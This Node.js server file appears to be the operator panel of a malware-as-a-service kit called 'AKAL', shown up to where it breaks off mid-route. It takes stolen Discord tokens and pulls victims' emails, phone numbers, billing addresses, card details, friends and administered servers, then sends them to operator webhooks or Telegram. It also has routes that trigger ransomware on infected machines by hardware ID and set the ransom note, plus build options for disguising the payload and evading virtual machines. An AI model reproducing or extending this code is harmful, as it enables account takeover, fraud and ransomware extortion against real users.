const express = require('express');
const http = require('http');
const rateLimit = require('express-rate-limit');
const mongoose = require('mongoose');
const session = require('express-session');
const crypto = require('crypto');
const axios = require('axios');
const path = require('path');
const config = require('../config.json');
const cors = require('cors');
const app = express();
const fs = require('fs-extra');
const moment = require('moment');
const emojisconfig = require('../emojis.json');
const multer = require('multer');
const { exec } = require('child_process');
const socketIo = require('socket.io');
const brotli = require('brotli');
const archiver = require('archiver');
const zlib = require('zlib');
const server = http.createServer(app);
const io = socketIo(server);
const { MongoClient } = require('mongodb');
const bodyParser = require("body-parser");
app.use(cors());

const clients = {};
const screenSizes = {}; 
const client = new MongoClient(config.mongodb);

const db = client.db('AKAL');
const keysCollection = db.collection('keys');

mongoose.connect(config.mongodb, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => {
    console.log('Connected to MongoDB');
}).catch(err => {
    console.error('MongoDB connection error:', err);
});

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use('/webcams', express.static(path.join(__dirname, 'public/webcams')));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const apiurl = `${config.ip}`;
const rickrollUrl = `https://${apiurl}/404`;
const vouchesPath = path.join(__dirname, '..', 'vouches'); 
app.use('/vouches', express.static(vouchesPath));

app.get('/windows', (req, res) => {
    res.render('windows');
});

app.get('/android', (req, res) => {
    res.render('android');
});

app.get('/payment', (req, res) => {
    res.render('payment');
});

app.get('/vouches', (req, res) => {
    res.render('vouches');
});

app.get('/api/vouches', (req, res) => {
    if (!fs.existsSync(vouchesPath)) {
        return res.status(404).json({ 
            error: 'Vouches directory not found',
            message: 'Please create a vouches folder in the project root'
        });
    }

    fs.readdir(vouchesPath, (err, files) => {
        if (err) {
            console.error('Error reading vouches directory:', err);
            return res.status(500).json({ 
                error: 'Error reading vouches directory',
                message: err.message
            });
        }

        try {
            const imageFiles = files
                .filter(file => {
                    const ext = path.extname(file).toLowerCase();
                    return ['.png', '.jpg', '.jpeg', '.gif', '.webp'].includes(ext);
                })
                .map(file => {
                    const filePath = path.join(vouchesPath, file);
                    const stats = fs.statSync(filePath);
                    
                    return {
                        name: file,
                        size: stats.size,
                        createdAt: stats.birthtime.toISOString(),
                        modifiedAt: stats.mtime.toISOString(),
                        path: `/vouches/${file}`
                    };
                })
                .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)); 

            res.json({
                success: true,
                count: imageFiles.length,
                vouches: imageFiles
            });

        } catch (statError) {
            console.error('Error getting file stats:', statError);
            res.status(500).json({ 
                error: 'Error processing files',
                message: statError.message
            });
        }
    });
});

const chat = {};
const screenTimers = {};

const createEmojiConstants = (emojisconfig) => {
    const emojiVariables = {};
  
    for (const [key, value] of Object.entries(emojisconfig)) {
      emojiVariables[key] = value;
    }
  
    return emojiVariables;
  };
  
const emojiVars = createEmojiConstants(emojisconfig);
const active_developer = emojiVars['active_developer'];
const brilliance = emojiVars['brilliance'];
const bravery = emojiVars['bravery'];
const bughunter = emojiVars['bughunter'];
const bughuntergold = emojiVars['bughuntergold'];
const discord_employee = emojiVars['discord_employee'];
const early_supporter = emojiVars['early_supporter'];
const early_verified_bot_developer = emojiVars['early_verified_bot_developer'];
const hypesquad_events = emojiVars['hypesquad_events'];
const moderatorprogramsalumni = emojiVars['moderatorprogramsalumni'];
const oldusername = emojiVars['oldusername'];
const partnered_server_owner = emojiVars['partnered_server_owner'];
const balance = emojiVars['balance'];

const badgesX = {
    Discord_Employee: { Value: 1, Emoji: discord_employee, Rare: true },
    Partnered_Server_Owner: { Value: 2, Emoji: partnered_server_owner, Rare: true },
    HypeSquad_Events: { Value: 4, Emoji: hypesquad_events, Rare: true },
    Bug_Hunter_Level_1: { Value: 8, Emoji: bughunter, Rare: true },
    Early_Supporter: { Value: 512, Emoji: early_supporter, Rare: true },
    Bug_Hunter_Level_2: { Value: 16384, Emoji: bughuntergold, Rare: true },
    Early_Verified_Bot_Developer: { Value: 131072, Emoji: early_verified_bot_developer, Rare: true },
    House_Bravery: { Value: 64, Emoji: bravery, Rare: false },
    House_Brilliance: { Value: 128, Emoji: brilliance, Rare: false },
    House_Balance: { Value: 256, Emoji: balance, Rare: false },
    Discord_Official_Moderator: { Value: 262144, Emoji: moderatorprogramsalumni, Rare: true },
    Legacy_Username: { Value: 32, Emoji: oldusername, Rare: false },
    Active_Developer: { Value: 4194304, Emoji: active_developer, Rare: false }
};

function getRareBadgesXX(flags) {
    const rareBadges = [];
    for (const prop in badgesX) {
        const badge = badgesX[prop];
        if ((flags & badge.Value) === badge.Value && badge.Rare) {
            rareBadges.push(badge.Emoji);
        }
    }
    return rareBadges.length > 0 ? rareBadges.join(' & ') : '';
}

async function sendEmbedToWebhook(content, title, webhookUrl) {
    try {
        const embed = {
            title: title,
            description: content,
            color: 0x00ff00,
            footer: {
                text: "AKAL - Badge & Account Scraper"
            }
        };

        console.log("Sending embed to webhook:", embed); 

        await axios.post(webhookUrl, {
            embeds: [embed]
        });

        console.log('Embed başarıyla gönderildi.');
    } catch (error) {
        console.error('Embed gönderilemedi:', error.message);
    }
}

async function runPythonScript(script, token, webhook_url) {
    return new Promise((resolve, reject) => {
        exec(`python ${script} ${token} ${webhook_url}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return reject(error);
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return reject(stderr);
            }
            console.log(`stdout: ${stdout}`);
            resolve(stdout);
        });
    });
}

async function runPythonScript2(script, token, webhook_url, gid, cid) {
    return new Promise((resolve, reject) => {
        exec(`python ${script} ${token} ${webhook_url} ${gid} ${cid}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return reject(error);
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return reject(stderr);
            }
            console.log(`stdout: ${stdout}`);
            resolve(stdout);
        });
    });
}

async function getAccountInfo(token, webhook_url) {
    try {
        const headers = { "Authorization": token };
        const accountResponse = await axios.get('https://discord.com/api/v10/users/@me', { headers });
        const billingResponse = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', { headers });
        const accountInfo = accountResponse.data;
        const billingInfo = billingResponse.data;

        const accountDetails = `**👤 User ID:** ${accountInfo.id}
**💬 Username:** ${accountInfo.username}
**📧 Email:** ${accountInfo.email || "None"}
**📞 Phone:** ${accountInfo.phone || "None"}
**🔒 MFA Enabled:** ${accountInfo.mfa_enabled ? "Yes" : "No"}
**🌍 Country:** ${accountInfo.locale || "Unknown"}
**💎 Nitro:** ${["None", "Nitro Classic", "Nitro Boost", "Nitro Basic"][accountInfo.premium_type] || "Unknown"}`;

        const billingDetails = billingInfo.length ? billingInfo.map(bill => {
            const details = bill.type === 1 ? `**💳 Card Brand:** ${bill.brand}
**💳 Card Number:** \`\`\`****-****-****-${bill.last_4}\`\`\`
**🏠 Address:** ${bill.billing_address.line_1}, ${bill.billing_address.city}, ${bill.billing_address.state}, ${bill.billing_address.country}` : "💳 Payment Method: PayPal";
            return details;
        }).join('\n') : '🔍 No Billing Information Found';

        const content = `${accountDetails}\n${billingDetails}`;
        await sendEmbedToWebhook(content, "Account & Billing Information", webhook_url);
    } catch (error) {
        await sendEmbedToWebhook("Error retrieving account information or billing details", "Error", webhook_url);
    }
}

app.post('/api/SCRAPERTOKEN', async (req, res) => {
    const { key, token, guildId, channelId } = req.body;
    const check = await keysCollection.findOne({ key: key });
    console.log(key, token);

    if (!check || !check.webhook) {
        return res.json({ success: false, message: 'No webhook URL found for this key.' });
    }

    try {
        await runPythonScript2('all.py', token, check.webhook, guildId, channelId);
        res.json({ success: true, message: "Token scraper runned." });
    } catch (error) {
        console.error("Error running token scraper:", error);
        res.json({ success: false, message: "Token scraper dont work." });
    }
});

app.post('/api/SCRAPERVC', async (req, res) => {
    const { key, token } = req.body;
    const check = await keysCollection.findOne({ key: key });
    console.log(key, token);

    if (!check || !check.webhook) {
        return res.json({ success: false, message: 'No webhook URL found for this key.' });
    }

    try {
        await runPythonScript('vc.py', token, check.webhook);
        res.json({ success: true, message: "VC scraper runned." });
    } catch (error) {
        console.error("Error running VC scraper:", error);
        res.json({ success: false, message: "VC scraper dont work." });
    }
});

app.post('/api/SCRAPERUSER', async (req, res) => {
    const { key, token } = req.body;
    const check = await keysCollection.findOne({ key: key });
    console.log(key, token);

    if (!check || !check.webhook) {
        return res.json({ success: false, message: 'No webhook URL found for this key.' });
    }

    await getAccountInfo(token, check.webhook);
    res.json({ success: true, message: "Account info has been sent to the webhook." });
});

app.post('/api/SCRAPERFRIEND', async (req, res) => {
    const { key, token } = req.body;
    const check = await keysCollection.findOne({ key: key });
    console.log("Key:", key, "Token:", token);

    if (!check || !check.webhook) {
        return res.json({ success: false, message: 'No webhook URL found for this key.' });
    }

    try {
        console.log("Fetching relationships...");
        const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
            headers: { "Authorization": token }
        });
        console.log("Relationships response:", response.data);

        if (!response.data || response.data.length === 0) {
            console.log("No relationships found.");
            await sendEmbedToWebhook("No relationships found.", "Friend Scan Result", check.webhook);
            return res.json({ success: true, message: "Friend scan result has been sent to the webhook." });
        }

        const friends = response.data.filter(user => user.type === 1);
        const friendDetails = friends.map(friend => {
            const badges = getRareBadgesXX(friend.user.public_flags);
            return badges ? `・ _${badges}_ : @${friend.user.username}` : null;
        }).filter(detail => detail).join('\n');

        const content = friendDetails || "・ Nothing to see here";
        await sendEmbedToWebhook(content, "Friend Scan Result", check.webhook);

        res.json({ success: true, message: "Friend scan result has been sent to the webhook." });
    } catch (error) {
        console.error("Error fetching relationships:", error);
        await sendEmbedToWebhook("・ Token not working or account locked", "Error", check.webhook);
        res.json({ success: false, message: "Error sending friend scan result to the webhook." });
    }
});

app.post('/api/SCRAPERGUILD', async (req, res) => {
    const { key, token } = req.body;
    const check = await keysCollection.findOne({ key: key });
    console.log("Key:", key, "Token:", token);

    if (!check || !check.webhook) {
        return res.json({ success: false, message: 'No webhook URL found for this key.' });
    }

    try {
        console.log("Fetching HQ guilds...");
        const headers = { "Authorization": token, "Content-Type": "application/json" };
        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", { headers });
        console.log("Guilds response:", response.data);

        const guilds = response.data;
        const guildDetails = await Promise.all(guilds.map(async (guild) => {
            const hasAdminPermissions = (parseInt(guild.permissions) & 0x8) === 0x8;
            if (guild.owner || hasAdminPermissions) {
                const invites = await axios.get(`https://discord.com/api/v9/guilds/${guild.id}/invites`, { headers }).catch(() => []);
                const inviteCode = invites.data[0] ? `https://discord.gg/${invites.data[0].code}` : 'No invite link available';
                return `・ [${guild.name}](${inviteCode}) : ${guild.approximate_member_count} Members : ${guild.premium_subscription_count || 0} Boosts`;
            }
        }));

        const content = guildDetails.filter(detail => detail).join('\n') || '・ No HQ Guilds Found';
        await sendEmbedToWebhook(content, "High-Quality Guilds", check.webhook);

        res.json({ success: true, message: "HQ guilds have been sent to the webhook." });
    } catch (error) {
        console.error("Error fetching guilds:", error);
        const errMsg = error.response ? `HTTPError: ${error.response.status}` : error.request ? `URLError: ${error.message}` : `Error: ${error.message}`;
        await sendEmbedToWebhook(errMsg, "Error", check.webhook);
        res.json({ success: false, message: "Error sending HQ guilds to the webhook." });
    }
});

app.use(bodyParser.json());

app.use(session({
    secret: config.secrettoken,
    resave: false,
    saveUninitialized: false,
    cookie: {
        maxAge: 10 * 60 * 1000, 
    }
}));

const storageX = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'tmp/'); 
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname); 
    }
});

const uploadX = multer({ storage: storageX });


const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const hwid = req.params.hwid;
        const uploadDir = path.join(__dirname, 'uploads', hwid);
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}-${file.originalname}`);
    }
});
const upload = multer({ storage });

app.post('/api/change-icon', uploadX.single('icon'), async (req, res) => {
    const key = req.body.key;
    const iconFile = req.file;

    if (!key || !iconFile) {
        return res.status(400).json({ success: false, message: 'Key and icon file are required.' });
    }

    const savePath = path.join(__dirname, `../icons/${key}.ico`);

    try {
        fs.renameSync(iconFile.path, savePath);
        console.log(`Icon has been successfully uploaded for key: ${key}`);
        res.json({ success: true, message: `Icon has been successfully uploaded for key: ${key}` });
    } catch (error) {
        console.error('An error occurred while saving the icon:', error);
        res.status(500).json({ success: false, message: 'An error occurred while saving the icon.' });
    }
});

app.get('/api/check-icon', (req, res) => {
    const key = req.query.key;

    if (!key) {
        return res.status(400).json({ exists: false, message: 'Key is required.' });
    }

    const iconPath = path.join(__dirname, `../icons/${key}.ico`);

    if (fs.existsSync(iconPath)) {
        return res.json({ exists: true });
    } else {
        return res.json({ exists: false });
    }
});

app.post('/api/reset-icon', (req, res) => {
    const { key } = req.body;


    if (!key) {
        return res.status(400).json({ success: false, message: 'Key is required.' });
    }

    const iconPath = path.join(__dirname, `../icons/${key}.ico`);

    if (fs.existsSync(iconPath)) {
        try {
            fs.unlinkSync(iconPath);
            console.log(`Icon for key ${key} has been deleted.`);
            return res.json({ success: true, message: `Icon for key ${key} has been successfully reset.` });
        } catch (err) {
            console.error('Error deleting the icon:', err);
            return res.status(500).json({ success: false, message: 'An error occurred while resetting the icon.' });
        }
    } else {
        console.log(`No icon found for key ${key}.`);
        return res.status(404).json({ success: false, message: 'No icon found for the specified key.' });
    }
});

const TELEGRAM_BOT_TOKEN = config.winbottoken;

app.get('/user/login', (req, res) => {
    res.render('login');
});

app.get('/keynotfound', (req, res) => {
    const errorMessage = 'Key not found in the database'; 
    res.render('invalid', { message: errorMessage });
});

app.get('/keynotredeem', (req, res) => {
    const errorMessage = 'Key not redeemed, pls redeem key.'; 
    res.render('invalid', { message: errorMessage });
});

app.get('/errorcontact', (req, res) => {
    const errorMessage = 'pls contact admin'; 
    res.render('invalid', { message: errorMessage });
});

app.get('/invalidotp', (req, res) => {
    const errorMessage = 'Invalid OTP Code. Pls back and try again.'; 
    res.render('invalid', { message: errorMessage });
});

app.get('/404', (req, res) => {
    const errorMessage = 'You are trying to access a device that is currently inactive or has never existed.'; 
    res.render('invalid', { message: errorMessage });
});

const rateLimitx = {};

app.get('/', (req, res) => {
    res.render('home');
});

app.get('/serverscraper/:key', (req, res) => { 
    const key = req.params.key; 
    res.render('serverscraper', { key: key }); 
});

app.post('/user/login', async (req, res) => {
    const { key } = req.body;
    const ip = req.ip; 
    const currentTime = Date.now();
    const timeLimit = 30 * 60 * 1000; 
    const requestLimit = 7;

    if (!rateLimitx[ip]) {
        rateLimitx[ip] = {
            count: 0,
            firstRequestTime: currentTime
        };
    }

    if (currentTime - rateLimitx[ip].firstRequestTime > timeLimit) {
        rateLimitx[ip].count = 0; 
        rateLimitx[ip].firstRequestTime = currentTime;
    }

    rateLimitx[ip].count++;

    let TELEGRAM_CHAT_ID = null;
    try {
        const check = await keysCollection.findOne({ key: key });
        TELEGRAM_CHAT_ID = check ? check.keyOwner : null;
    } catch (error) {
        console.error('Error fetching chat ID:', error);
    }

    if (rateLimitx[ip].count > requestLimit) {
        try {
            if (TELEGRAM_CHAT_ID) {
                const message = "You have reached the limit for requesting OTP codes. Please try again later.";
                await sendmsgtg(message, TELEGRAM_CHAT_ID); 
            }
        } catch (error) {
            console.error('Error sending limit message:', error);
        }
        return res.redirect('https://www.youtube.com/watch?v=q0hyYWKXF0Q');
    }

    try {
        if (!TELEGRAM_CHAT_ID) {
            return res.redirect('/keynotredeem');
        }

        const otp = generateOTP();
        req.session.otp = otp;
        req.session.key = key;

        const message = `Your OTP code is: \`${otp}\``; 
        await sendmsgtg(message, TELEGRAM_CHAT_ID);
        
        res.redirect('/user/otp');
    } catch (error) {
        console.error('Error:', error);
        return res.redirect('/errorcontact');
    }
});

app.get('/user/otp', (req, res) => {
    if (!req.session.otp) {
        return res.redirect('/user/login');
    }
    res.render('otp');
});

app.post('/user/otp', (req, res) => {
    const { otp } = req.body;

    if (otp === req.session.otp) {
        req.session.isAuthenticated = true;
        res.redirect('/dashboard/user');
    } else {
        res.redirect('/invalidotp');
    }
});

app.get('/victims/:hwid/ransomware', checkHwid, async (req, res) => {
    const hwid = req.params.hwid;
    res.render('ransomware', { hwid });
});

app.post('/victims/:hwid/ransomware', checkHwid, async (req, res) => {
    const hwid = req.params.hwid;

    if (clients[hwid]) {
        console.log(`Sending control action to client with HWID: ${hwid}`);
        clients[hwid].emit('ransomware');
        res.status(200).send({ message: 'Control action sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.post('/victims/:hwid/ransomware/CHANGEWALLPAPER', checkHwid, async (req, res) => {
    const hwid = req.params.hwid;
    const { wallpaperUrl } = req.body;

    await keysCollection.updateOne(
        { hwids: hwid },
        { $set: { Rwallpaper_url: wallpaperUrl } }
    );

    res.json({ success: true, message: "Wallpaper URL updated successfully!" });
});

app.post('/victims/:hwid/ransomware/CHANGEREADME', checkHwid, async (req, res) => {
    const hwid = req.params.hwid;
    const { message } = req.body;
   
    await keysCollection.updateOne(
        { hwids: hwid },
        { $set: { Rmessage: message } }
    );

    res.json({ success: true, message: "README message updated successfully!" });
});

app.get('/errorcontact', (req, res) => {
    const errorMessage = 'pls contact admin'; 
    res.render('invalid', { message: errorMessage });
});

app.get('/keynotredeem', (req, res) => {
    res.render('invalid', { message: 'Key not redeemed, please redeem key.' });
});

function generateOTP() {
    return crypto.randomInt(100000, 999999).toString();
}

async function sendmsgtg(message, TELEGRAM_CHAT_ID) {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        await axios.post(telegramApiUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
        console.log('OTP successfully sent to Telegram.' + message);
    } catch (error) {
        console.error('Error sending OTP to Telegram:', error);
        throw new Error('Failed to send OTP');
    }
}

function ensureDirectoryExists(directory) {
    if (!fs.existsSync(directory)) {
        fs.mkdirSync(directory, { recursive: true });
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "Discord_Employee",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "Partnered_Server_Owner",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "HypeSquad_Events",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "Bug_Hunter_Level_1",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "Early_Supporter",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "Bug_Hunter_Level_2",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "Early_Verified_Bot_Developer",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "House_Bravery",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "House_Brilliance",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "House_Balance",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "Discord_Official_Moderator",
        Rare: true,
    }
};

function getRareBadges(flags) {
    const rareBadges = [];

    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) === o.Value && o.Rare) {
            rareBadges.push(o.Emoji);
        }
    }

    return rareBadges.length > 0 ? rareBadges.join(' & ') : '';
}

async function getRelationships(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });
        const json = response.data;
        const r = json.filter((user) => user.type == 1);
        let gay = '';

        for (const z of r) {
            const b = getRareBadges(z.user.public_flags);
            if (b !== "") {
                gay += `・ _${b}_ : @${z.user.username}\n`;
            }
        }

        return gay === '' ? "・ Nothing to see here" : gay;
    } catch (error) {
        return `・ token not work or account locked`;
    }
}

async function getHqGuilds(token) {
    try {
        let hqGuilds = '';
        const headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        };

        const guildsResponse = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", { headers });
        const guilds = guildsResponse.data;

        for (let guild of guilds) {
            if (guild["approximate_member_count"] < 1) continue;

            const hasAdminPermissions = (parseInt(guild["permissions"]) & 0x8) === 0x8;

            if (guild["owner"] || hasAdminPermissions) {
                try {
                    const guildDetailsResponse = await axios.get(`https://discord.com/api/v9/guilds/${guild['id']}`, { headers });
                    const guildDetails = guildDetailsResponse.data;

                    const invitesResponse = await axios.get(`https://discord.com/api/v9/guilds/${guild['id']}/invites`, { headers });
                    const invites = invitesResponse.data;
                    const inviteCode = invites.length > 0 ? `https://discord.gg/${invites[0]['code']}` : false;

                    const boostCount = guildDetails.premium_subscription_count || 0;

                    if (inviteCode) {
                        hqGuilds += `・ [${guild['name']}](${inviteCode}) : ${guild['approximate_member_count']} Members : ${boostCount} Boosts\n`;
                    } else {
                        hqGuilds += `・ ${guild['name']} : ${guild['approximate_member_count']} Members : ${boostCount} Boosts _No invite link available_\n`;
                    }
                } catch (error) {
                    console.error(`Error fetching details or invites for guild ${guild['id']}: ${error.message}`);
                }
            }
        }

        if (hqGuilds === '') return '・ No HQ Guilds Found';
        return hqGuilds;
    } catch (error) {
        if (error.response) {
            return `HTTPError: ${error.response.status}`;
        } else if (error.request) {
            return `URLError: ${error.message}`;
        } else {
            return `Error: ${error.message}`;
        }
    }
}

app.post('/api/friends', async (req, res) => {
    const token = req.body.token;
    const timestamp = Date.now();
    const filePath = path.join(__dirname, 'tmp', `friends_${timestamp}.txt`);

    ensureDirectoryExists(path.join(__dirname, 'tmp'));

    try {
        const result = await getRelationships(token);
        const watermark = '\n\n---\nAKAL\n\n---';
        fs.writeFileSync(filePath, result + watermark);
        res.download(filePath);
    } catch (error) {
        console.error('Error writing file:', error);
        return res.status(500).json({ success: false, message: 'The token is incorrect or there is an API problem.' });
    }
});

app.post('/api/guilds', async (req, res) => {
    const { token } = req.body;
    const timestamp = Date.now();
    const filePath = path.join(__dirname, 'tmp', `guilds_${timestamp}.txt`);

    ensureDirectoryExists(path.join(__dirname, 'tmp'));

    try {
        const result = await getHqGuilds(token);
        const watermark = '\n\n---\nAKAL\n\n---';
        fs.writeFileSync(filePath, result + watermark);
        res.download(filePath);
    } catch (error) {
        console.error('Error writing file:', error);
        return res.status(500).json({ success: false, message: 'The token is incorrect or there is an API problem.' });
    }
});

app.post('/api/scan', async (req, res) => {
    const { token } = req.body;
    const timestamp = Date.now();
    const filePath = path.join(__dirname, 'tmp', `information_${timestamp}.txt`);

    ensureDirectoryExists(path.join(__dirname, 'tmp'));

    try {
        const accountResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { 'Authorization': token }
        });
        const accountInfo = accountResponse.data;

        const billingResponse = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
            headers: { 'Authorization': token }
        });
        const billingInfo = billingResponse.data;

        const accountDetails = `🔍 Account Information:

👤 User ID: ${accountInfo.id}
💬 Username: ${accountInfo.username}
🆔 Public Name: ${accountInfo.global_name}
📧 Email: ${accountInfo.email}
📞 Phone: ${accountInfo.phone ? accountInfo.phone : "None"}
🔒 MFA Enabled: ${accountInfo.mfa_enabled}
🌍 Country: ${accountInfo.locale}
💎 Nitro: ${accountInfo.premium_type === 0 ? "None" : accountInfo.premium_type === 1 ? "Nitro Classic" : accountInfo.premium_type === 2 ? "Nitro Boost" : accountInfo.premium_type === 3 ? "Nitro Basic" : "Unknown"}
        `;

        let billingDetails = '';
        if (billingInfo.length > 0) {
            billingDetails = '💳 Billing Information:\n\n';
            billingInfo.forEach((bill) => {
                billingDetails += `
💳 Payment Method: ${bill.type === 1 ? "Credit Card" : bill.type === 2 ? "PayPal" : "Unknown"}
${bill.type === 1 ? `💳 Card Brand: ${bill.brand}
💳 Card Number: ****-****-****-${bill.last_4}
💳 Card Expiry: ${bill.expires_month}/${bill.expires_year}
💳 Card Holder: ${bill.billing_address.name}
🏠 Address: ${bill.billing_address.line_1}, ${bill.billing_address.city}, ${bill.billing_address.state}, ${bill.billing_address.country}
` : ""}`;
            });
        } else {
            billingDetails = '🔍 No Billing Information Found';
        }

        const result = await getHqGuilds(token);

        const completeData = `${accountDetails}\n${billingDetails}\n${result}\n\n---\nAKAL\n\n---`;

        fs.writeFileSync(filePath, completeData, 'utf8');
        res.download(filePath);
    } catch (error) {
        console.error('Error writing file:', error);
        return res.status(500).json({ success: false, message: 'The token is incorrect or there is an API problem.' });
    }
});

app.post('/api/update-file-name', async (req, res) => {
    const { key, fileName } = req.body;
    try {
        console.log(`Updating file name for key: ${key}`);
        const result = await keysCollection.updateOne({ key }, { $set: { productName: fileName } });
        if (result.matchedCount === 0) {
            console.warn(`No document matched for key: ${key}`);
            return res.json({ success: false, message: 'No document matched for the provided key.' });
        }
        console.log(`File name updated successfully for key: ${key}`);
        res.json({ success: true, message: `File name updated to: ${fileName}` });
    } catch (error) {
        console.error('Error updating file name:', error);
        res.json({ success: false, message: 'Error updating file name.' });
    }
});

app.post('/api/update-company-name', async (req, res) => {
    const { key, companyName } = req.body;
    try {
        console.log(`Updating company name for key: ${key}`);
        const result = await keysCollection.updateOne({ key }, { $set: { companyName: companyName } });
        if (result.matchedCount === 0) {
            console.warn(`No document matched for key: ${key}`);
            return res.json({ success: false, message: 'No document matched for the provided key.' });
        }
        console.log(`Company name updated successfully for key: ${key}`);
        res.json({ success: true, message: `Company name updated to: ${companyName}` });
    } catch (error) {
        console.error('Error updating company name:', error);
        res.json({ success: false, message: 'Error updating company name.' });
    }
});

app.post('/api/update-file-description', async (req, res) => {
    const { key, fileDescription } = req.body;
    try {
        console.log(`Updating file description for key: ${key}`);
        const result = await keysCollection.updateOne({ key }, { $set: { fileDescription: fileDescription } });
        if (result.matchedCount === 0) {
            console.warn(`No document matched for key: ${key}`);
            return res.json({ success: false, message: 'No document matched for the provided key.' });
        }
        console.log(`File description updated successfully for key: ${key}`);
        res.json({ success: true, message: `File description updated to: ${fileDescription}` });
    } catch (error) {
        console.error('Error updating file description:', error);
        res.json({ success: false, message: 'Error updating file description.' });
    }
});

app.post('/api/set-webhook', async (req, res) => {
    const { key, webhookUrl } = req.body;
    try {
        console.log(`Updating webhook URL for key: ${key}`);
        const result = await keysCollection.updateOne({ key }, { $set: { webhook: webhookUrl } });
        if (result.matchedCount === 0) {
            console.warn(`No document matched for key: ${key}`);
            return res.json({ success: false, message: 'No document matched for the provided key.' });
        }
        console.log(`Webhook URL updated successfully for key: ${key}`);
        res.json({ success: true, message: `Webhook URL updated to: ${webhookUrl}` });
    } catch (error) {
        console.error('Error updating webhook:', error);
        res.json({ success: false, message: 'Error updating webhook.' });
    }
});

app.post('/api/set-tgtoken', async (req, res) => {
    const { key, tgtoken } = req.body;
    try {
        console.log(`Updating tgtoken for key: ${key}`);
        const result = await keysCollection.updateOne({ key }, { $set: { tgtoken: tgtoken } });
        if (result.matchedCount === 0) {
            console.warn(`No document matched for key: ${key}`);
            return res.json({ success: false, message: 'No document matched for the provided key.' });
        }
        console.log(`tgtoken updated successfully for key: ${key}`);
        res.json({ success: true, message: `tgtoken updated to: ${tgtoken}` });
    } catch (error) {
        console.error('Error updating tgtoken:', error);
        res.json({ success: false, message: 'Error updating tgtoken.' });
    }
});

app.post('/api/testmsgdc', async (req, res) => {
    const { key } = req.body;
    try {
        const check = await keysCollection.findOne({ key: key });

        if (!check || !check.webhook) {
            return res.json({ success: false, message: 'No webhook URL found for this key.' });
        }

        const webhook = check.webhook;
        const message = {
            content: "TEST MESSAGE"
        };

        await axios.post(webhook, message);

        res.json({ success: true, message: 'Message sent to Discord webhook successfully.' });
    } catch (error) {
        console.error('Error sending message to Discord webhook:', error);
        res.json({ success: false, message: 'Error sending message to Discord webhook.' });
    }
});

app.post('/api/testmsgtg', async (req, res) => {
    const { key } = req.body;
    try {
        const check = await keysCollection.findOne({ key: key });

        if (!check || !check.keyOwner) {
            return res.json({ success: false, message: 'No chat ID found for this key.' });
        }

        const chatId = check.keyOwner;
        const message = "TEST MESSAGE";

        await sendmsgtg2(TELEGRAM_BOT_TOKEN, chatId, message);

        res.json({ success: true, message: 'Message sent to Telegram successfully.' });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.json({ success: false, message: 'Error sending message to Telegram.' });
    }
});

async function sendmsgtg2(token, TELEGRAM_CHAT_ID, message) {
    const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    try {
        await axios.post(telegramApiUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (error) {
        console.error('Telegram mesaj gönderme hatası:', error.response?.data || error.message);
        throw error; 
    }
}

app.post('/api/manage-build-settings', async (req, res) => {
    const { key, buildOption } = req.body;
    try {
        const result = await keysCollection.updateOne(
            { key: key },
            { $set: { buildOption: buildOption } }
        );

        if (result.matchedCount > 0) {
            res.json({ success: true, message: `Build option updated to: ${buildOption}` });
        } else {
            res.json({ success: false, message: 'No document matched the provided key.' });
        }
    } catch (error) {
        console.error('Error updating build option:', error);
        res.status(500).json({ success: false, message: 'Error updating build option.' });
    }
});

app.post('/api/manage-antivm-settings', async (req, res) => {
    const { key, AntiVM } = req.body;
    try {
        const result = await keysCollection.updateOne(
            { key: key },
            { $set: { AntiVM: AntiVM } }
        );

        if (result.matchedCount > 0) {
